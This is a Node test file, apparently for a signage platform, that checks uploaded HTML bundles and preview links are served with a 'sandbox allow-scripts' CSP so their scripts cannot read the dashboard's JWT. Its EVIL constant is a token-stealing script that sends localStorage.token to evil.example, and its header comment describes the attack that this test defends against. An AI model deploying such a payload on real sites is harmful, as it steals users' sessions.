'use strict';

/*
 * An HTML bundle must run in an opaque origin even when nobody frames it (audit F04).
 *
 * ⚠️ THE ATTACK THIS PINS: a trial tenant uploads a zip whose index.html reads
 * localStorage.token, puts it in one of their own playlists (which satisfies the public /bundle
 * gate), and sends the /bundle URL to a platform admin. Opened in a tab, that document used to be
 * served from the dashboard's origin with no CSP at all, so its script could read the admin's JWT.
 * The player frame's sandbox attribute never applied, because there was no frame. The fix is the
 * same header template renders send: `Content-Security-Policy: sandbox allow-scripts`, with no
 * allow-same-origin. Both routes that serve a bundle are checked, the public one and the
 * dashboard's 5-minute preview, since either URL can be sent to someone.
 */

const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const { spawn } = require('node:child_process');
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');
const zlib = require('node:zlib');
const crypto = require('node:crypto');
const Database = require('better-sqlite3');
const { freePort } = require('./helpers/free-port');

const DATA_DIR = path.join(os.tmpdir(), 'st-bundlecsp-' + crypto.randomBytes(4).toString('hex'));
let PORT, BASE, proc, db;

/* Minimal STORED zip writer, the same shape bundle-inline.test.js uses. */
function zip(entries) {
  const locals = []; const central = []; let offset = 0;
  for (const [name, data] of Object.entries(entries)) {
    const raw = Buffer.from(data);
    const nb = Buffer.from(name, 'utf8');
    const crc = zlib.crc32 ? zlib.crc32(raw) >>> 0 : 0;
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(0x800, 6);
    lh.writeUInt32LE(crc, 14); lh.writeUInt32LE(raw.length, 18); lh.writeUInt32LE(raw.length, 22);
    lh.writeUInt16LE(nb.length, 26);
    locals.push(lh, nb, raw);
    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(0x031e, 4); ch.writeUInt16LE(20, 6);
    ch.writeUInt16LE(0x800, 8); ch.writeUInt32LE(crc, 16);
    ch.writeUInt32LE(raw.length, 20); ch.writeUInt32LE(raw.length, 24);
    ch.writeUInt16LE(nb.length, 28); ch.writeUInt32LE((0o100644 << 16) >>> 0, 38);
    ch.writeUInt32LE(offset, 42);
    central.push(ch, nb);
    offset += lh.length + nb.length + raw.length;
  }
  const cd = Buffer.concat(central);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(Object.keys(entries).length, 8); eocd.writeUInt16LE(Object.keys(entries).length, 10);
  eocd.writeUInt32LE(cd.length, 12); eocd.writeUInt32LE(offset, 16);
  return Buffer.concat([...locals, cd, eocd]);
}

before(async () => {
  PORT = await freePort();
  BASE = `http://127.0.0.1:${PORT}`;
  const logFd = fs.openSync(path.join(os.tmpdir(), 'st-bundlecsp.log'), 'w');
  proc = spawn('node', ['server.js'], {
    cwd: path.join(__dirname, '..'),
    env: { ...process.env, DATA_DIR, SELF_HOSTED: 'true', PORT: String(PORT), NODE_ENV: 'test' },
    stdio: ['ignore', logFd, logFd],
  });
  let up = false;
  for (let i = 0; i < 80; i++) {
    try { const r = await fetch(BASE + '/api/status'); if (r.ok) { up = true; break; } } catch { /* not yet */ }
    await new Promise((r) => setTimeout(r, 250));
  }
  if (!up) throw new Error('server did not boot');
  db = new Database(path.join(DATA_DIR, 'db', 'remote_display.db'));
});
after(() => {
  try { db && db.close(); } catch { /* */ }
  try { proc.kill('SIGKILL'); } catch { /* */ }
  try { fs.rmSync(DATA_DIR, { recursive: true, force: true }); } catch { /* */ }
});

const EVIL = '<!doctype html><html><body><script>fetch("https://evil.example/?t="+localStorage.getItem("token"))</script></body></html>';

/** Register a tenant and give it a bundle in one of its own playlists: the attacker's whole setup. */
async function seedAttackerBundle() {
  const email = 'b' + crypto.randomBytes(4).toString('hex') + '@x.local';
  const r = await fetch(BASE + '/api/auth/register', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password: 'Passw0rd123' }),
  });
  const token = (await r.json()).token;
  assert.ok(token, 'registered');
  const userId = db.prepare('SELECT id FROM users WHERE email = ?').get(email).id;
  const wsId = db.prepare("SELECT workspace_id FROM workspace_members WHERE user_id = ? AND role = 'workspace_admin'").get(userId).workspace_id;

  const contentDir = path.join(DATA_DIR, 'uploads', 'content');
  fs.mkdirSync(contentDir, { recursive: true });
  const contentId = crypto.randomUUID();
  const file = contentId + '.zip';
  fs.writeFileSync(path.join(contentDir, file), zip({ 'index.html': EVIL }));
  db.prepare(`INSERT INTO content (id, user_id, filename, filepath, mime_type, file_size, workspace_id, bundle_entry)
              VALUES (?, ?, 'evil.zip', ?, 'application/vnd.screentinker.bundle+zip', 1, ?, 'index.html')`)
    .run(contentId, userId, file, wsId);
  const plId = crypto.randomUUID();
  db.prepare("INSERT INTO playlists (id, user_id, name, workspace_id) VALUES (?, ?, 'p', ?)").run(plId, userId, wsId);
  db.prepare('INSERT INTO playlist_items (playlist_id, content_id) VALUES (?, ?)').run(plId, contentId);
  return { token, contentId };
}

function assertOpaqueOrigin(res, label) {
  const csp = res.headers.get('content-security-policy') || '';
  assert.match(csp, /(^|;)\s*sandbox allow-scripts\s*(;|$)/, `${label}: sandbox allow-scripts CSP (got ${JSON.stringify(csp)})`);
  assert.doesNotMatch(csp, /allow-same-origin/, `${label}: never allow-same-origin, or the sandbox is moot`);
}

test('⚠️ /api/content/:id/bundle opened top-level runs in an opaque origin, not the dashboard\'s', async () => {
  const { contentId } = await seedAttackerBundle();
  // No credentials: the attacker's own playlist is what opens the gate, exactly as in the attack.
  const r = await fetch(`${BASE}/api/content/${contentId}/bundle`);
  assert.equal(r.status, 200, 'the public gate lets a playlisted bundle through');
  assert.match(r.headers.get('content-type') || '', /text\/html/);
  assert.match(await r.text(), /localStorage/, 'the bundle script is served as-is (scripts must still run)');
  assertOpaqueOrigin(r, '/bundle');
  // The rev-pinned, hard-cached variant is the one players hold onto; it must carry it too.
  const r2 = await fetch(`${BASE}/api/content/${contentId}/bundle?rev=1`);
  assert.equal(r2.status, 200);
  assertOpaqueOrigin(r2, '/bundle?rev=');
});

test('⚠️ the dashboard bundle preview is sandboxed the same way', async () => {
  const { token, contentId } = await seedAttackerBundle();
  const mint = await fetch(`${BASE}/api/content/${contentId}/bundle-preview`, {
    method: 'POST', headers: { Authorization: 'Bearer ' + token },
  });
  assert.equal(mint.status, 200, 'preview minted');
  const { url } = await mint.json();
  // Opened by someone else, with no session: the URL alone is the capability.
  const r = await fetch(BASE + url);
  assert.equal(r.status, 200);
  assertOpaqueOrigin(r, '/bundle-preview');
});
